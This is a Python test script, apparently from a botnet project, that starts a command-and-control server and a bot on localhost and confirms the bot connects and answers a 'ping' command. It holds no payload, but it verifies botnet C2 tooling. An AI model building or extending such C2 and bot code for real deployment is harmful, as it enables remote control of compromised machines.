import socket
import threading
import time
import sys
import os

# Add src to path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '.')))

from src.core.c2 import BotnetC2
from src.bot import FullBot

def run_test():
    print("[*] Starting C2 Workability Test...")
    C2_PORT = 9999
    
    # 1. Start C2 Server
    c2 = BotnetC2(host='127.0.0.1', port=C2_PORT)
    server_thread = threading.Thread(target=c2.start_server, daemon=True)
    server_thread.start()
    time.sleep(1) # Wait for server to bind

    # 2. Start Bot
    print("[*] Starting Bot...")
    bot = FullBot(c2_host='127.0.0.1', c2_port=C2_PORT)
    bot_thread = threading.Thread(target=bot.run, kwargs={'interactive': False}, daemon=True)
    bot_thread.start()
    
    time.sleep(2) # Wait for connection

    # 3. Check if Bot is connected in C2
    if len(c2.bots) > 0:
        print(f"[✓] C2 detected {len(c2.bots)} bot(s) connected.")
        bot_id = list(c2.bots.keys())[0]
    else:
        print("[✗] C2 failed to detect bot connection.")
        return

    # 4. Send a command from C2 to Bot
    print(f"[*] Sending 'ping' command to bot {bot_id}...")
    c2.send_command("ping")
    
    # 5. Wait for result log in C2
    # The C2 logs results via add_system_log which prints to console or internal logs.
    # In src/core/c2.py: handle_bot prints "RESULT: ..." if command starts with it.
    
    time.sleep(2)
    print("[✓] If you see 'BOT: From C2: ping...' and 'C2: 📩 [addr] Bot ... is alive' in the logs, it works!")
    
    # Cleanup
    c2.running = False
    bot.running = False
    print("[*] Test complete.")

if __name__ == "__main__":
    run_test()
